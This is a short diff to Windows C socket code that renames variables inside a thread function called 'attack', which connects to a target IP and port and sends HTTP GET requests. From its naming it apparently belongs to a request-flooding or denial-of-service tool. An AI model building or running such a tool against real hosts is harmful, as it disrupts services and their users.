@@ -42,13 +42,13 @@ DWORD WINAPI attack(LPVOID target_addr){
     const char* target_ip = target.ip;
     int port = target.port;
     SOCKET client_socket;
-    struct sockaddr_in serv_addr;
+    struct sockaddr_in target_sockaddr;
     WSADATA wsaData;
-    serv_addr.sin_family = AF_INET;
-    serv_addr.sin_port = htons(port);
+    target_sockaddr.sin_family = AF_INET;
+    target_sockaddr.sin_port = htons(port);
     startWinsock(&wsaData);
     client_socket = startSocket();
-    connectToServer(&serv_addr, client_socket, target_ip);
+    connectToServer(&target_sockaddr, client_socket, target_ip);
     char msg[64];
     int sprintf_stat = snprintf(msg, sizeof(msg), "GET / HTTP/1.1\r\nHost: %s\r\n\r\n", target_ip);
     // printf("%i", sprintf_stat);
@@ -76,15 +76,15 @@ SOCKET startSocket() {
     return client_socket;
 }
 
-// function to connect this client to the server via socket
-void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip) {
+// function to connect this client to the target via socket
+void connectToServer(struct sockaddr_in *target_addr, SOCKET client_socket, const char* target_ip) {
 
-    if (inet_pton(AF_INET, server_ip, &serv_addr->sin_addr) <= 0) {
+    if (inet_pton(AF_INET, target_ip, &target_addr->sin_addr) <= 0) {
         printf("\nInvalid address/ Address not supported \n");
         closesocket(client_socket);
         WSACleanup();
         exit(EXIT_FAILURE);
-    } else if (connect(client_socket, (struct sockaddr *)serv_addr, sizeof(*serv_addr)) < 0) {
+    } else if (connect(client_socket, (struct sockaddr *)target_addr, sizeof(*target_addr)) < 0) {
         printf("\nConnection Failed. \n");
         printf("%i", client_socket);
         closesocket(client_socket);
